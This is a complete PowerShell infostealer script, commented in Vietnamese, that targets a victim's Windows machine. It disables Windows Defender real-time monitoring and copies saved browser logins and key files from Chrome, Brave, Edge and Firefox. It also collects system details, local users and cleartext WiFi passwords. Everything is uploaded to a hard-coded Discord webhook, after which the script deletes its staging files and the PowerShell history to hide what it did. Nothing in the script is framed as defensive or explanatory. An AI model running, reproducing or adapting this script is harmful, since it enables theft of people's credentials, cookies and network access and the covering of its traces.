#-- Payload configuration --#

$WEBHOOK_URL = 'https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj'

# Thư mục tạm trên máy nạn nhân
$destDir = "$env:TEMP\Exfil_$env:USERNAME"
if (-Not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir -Force
}

# Tạo thư mục con
$sysInfoDir = "$destDir\SystemInfo"
New-Item -ItemType Directory -Path $sysInfoDir -Force

# Tắt Windows Defender
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
} catch {}

# ==========================================
# DISCORD WEBHOOK FUNCTION
# ==========================================
function Send-DiscordFile {
    param([string]$FilePath, [string]$Description = "")
    if (-Not (Test-Path $FilePath)) { 
        Write-Host "[-] File not found: $FilePath"
        return 
    }
    try {
        $fileName = Split-Path $FilePath -Leaf
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $base64Content = [Convert]::ToBase64String($fileBytes)
        $payload = @{
            content = $Description
            files = @(@{ name = $fileName; content = $base64Content })
        } | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $WEBHOOK_URL -Method Post -Body $payload -ContentType "application/json" -ErrorAction SilentlyContinue
        Write-Host "[+] Sent: $fileName"
    } catch {
        Write-Host "[-] Failed to send: $fileName"
    }
}

# Function to copy browser files (dùng PowerShell thuần)
function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
    $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
    if (-Not (Test-Path $browserDir)) {
        Write-Host "$browserName - Directory not found"
        return
    }
    
    New-Item -ItemType Directory -Path $browserDestDir -Force | Out-Null

    foreach ($file in $filesToCopy) {
        $source = Join-Path -Path $browserDir -ChildPath $file
        if (Test-Path $source) {
            try {
                # Dùng Copy-Item với force
                Copy-Item -Path $source -Destination $browserDestDir -Force -ErrorAction Stop
                Write-Host "$browserName - Copied: $file"
            } catch {
                # Nếu lỗi, thử dùng File.Copy
                try {
                    [System.IO.File]::Copy($source, (Join-Path $browserDestDir $file), $true)
                    Write-Host "$browserName - Copied (alternative): $file"
                } catch {
                    Write-Host "$browserName - Failed to copy: $file"
                }
            }
        } else {
            Write-Host "$browserName - Not found: $file"
        }
    }
}

# ==========================================
# 1. GOOGLE CHROME
# ==========================================
$chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
if (Test-Path $chromeDir) {
    CopyBrowserFiles "Chrome" $chromeDir @("Login Data")
    $localState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
    if (Test-Path $localState) {
        Copy-Item $localState "$destDir\Chrome\" -Force -ErrorAction SilentlyContinue
    }
}

# ==========================================
# 2. BRAVE
# ==========================================
$braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
if (Test-Path $braveDir) {
    CopyBrowserFiles "Brave" $braveDir @("Login Data")
    $localState = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
    if (Test-Path $localState) {
        Copy-Item $localState "$destDir\Brave\" -Force -ErrorAction SilentlyContinue
    }
}

# ==========================================
# 3. FIREFOX
# ==========================================
$firefoxProfiles = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $firefoxProfiles) {
    $firefoxProfile = Get-ChildItem -Path $firefoxProfiles -Filter "*.default*" | Select-Object -First 1
    if ($firefoxProfile) {
        CopyBrowserFiles "Firefox" $firefoxProfile.FullName @("logins.json", "key4.db", "cookies.sqlite")
    }
}

# ==========================================
# 4. MICROSOFT EDGE
# ==========================================
$edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
if (Test-Path $edgeDir) {
    CopyBrowserFiles "Edge" $edgeDir @("Login Data")
    $localState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
    if (Test-Path $localState) {
        Copy-Item $localState "$destDir\Edge\" -Force -ErrorAction SilentlyContinue
    }
}

# ==========================================
# 5. SYSTEM INFORMATION
# ==========================================
Write-Host "[+] Gathering system information..."
Get-ComputerInfo | Out-File "$sysInfoDir\computer_info.txt" -ErrorAction SilentlyContinue
Get-Process | Out-File "$sysInfoDir\process_list.txt" -ErrorAction SilentlyContinue
Get-Service | Out-File "$sysInfoDir\service_list.txt" -ErrorAction SilentlyContinue
Get-NetIPAddress | Out-File "$sysInfoDir\network_config.txt" -ErrorAction SilentlyContinue
Get-LocalUser | Where-Object { $_.Enabled } | Out-File "$sysInfoDir\local_users.txt" -ErrorAction SilentlyContinue

# ==========================================
# 6. WIFI PASSWORDS
# ==========================================
Write-Host "[+] Extracting WiFi passwords..."
$wifiFile = "$destDir\WiFi_Details.txt"
"="*60 | Out-File $wifiFile
"WiFi Passwords for $env:COMPUTERNAME" | Out-File $wifiFile -Append
"Extracted: $(Get-Date)" | Out-File $wifiFile -Append
"="*60 | Out-File $wifiFile -Append

$wifiProfiles = netsh wlan show profiles | Select-String ":\s(.*)$" | ForEach-Object { $_.Matches[0].Groups[1].Value }
foreach ($profile in $wifiProfiles) {
    $profileDetails = netsh wlan show profile name="$profile" key=clear
    $keyContent = ($profileDetails | Select-String "Key Content\s+:\s+(.*)$").Matches.Groups[1].Value
    if (-not $keyContent) { $keyContent = "No password (Open network)" }
    "[$profile] $keyContent" | Out-File $wifiFile -Append
}

# ==========================================
# 7. GỬI DỮ LIỆU QUA DISCORD
# ==========================================
Write-Host "[+] Sending data to Discord..."

# Gửi WiFi
if (Test-Path $wifiFile) {
    Send-DiscordFile $wifiFile "WiFi Passwords"
}

# Gửi System Info
Send-DiscordFile "$sysInfoDir\computer_info.txt" "Computer Info"
Send-DiscordFile "$sysInfoDir\local_users.txt" "Local Users"

# Gửi từng trình duyệt (nếu có dữ liệu)
$browsers = @("Chrome", "Brave", "Edge", "Firefox")
foreach ($browser in $browsers) {
    $browserDir = "$destDir\$browser"
    if (Test-Path $browserDir) {
        $files = Get-ChildItem $browserDir -File
        if ($files.Count -gt 0) {
            $zipPath = "$env:TEMP\$browser-$env:USERNAME.zip"
            Compress-Archive -Path "$browserDir\*" -DestinationPath $zipPath -Force
            if (Test-Path $zipPath) {
                Send-DiscordFile $zipPath "$browser Credentials"
                Remove-Item $zipPath -Force
            }
        }
    }
}

# ==========================================
# 8. DỌN DẸP
# ==========================================
Write-Host "[+] Cleaning up..."
Remove-Item $destDir -Recurse -Force -ErrorAction SilentlyContinue
Clear-History
$historyPath = (Get-PSReadLineOption).HistorySavePath
if ($historyPath -and (Test-Path $historyPath)) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
}

Write-Host "[+] Done!"

exit
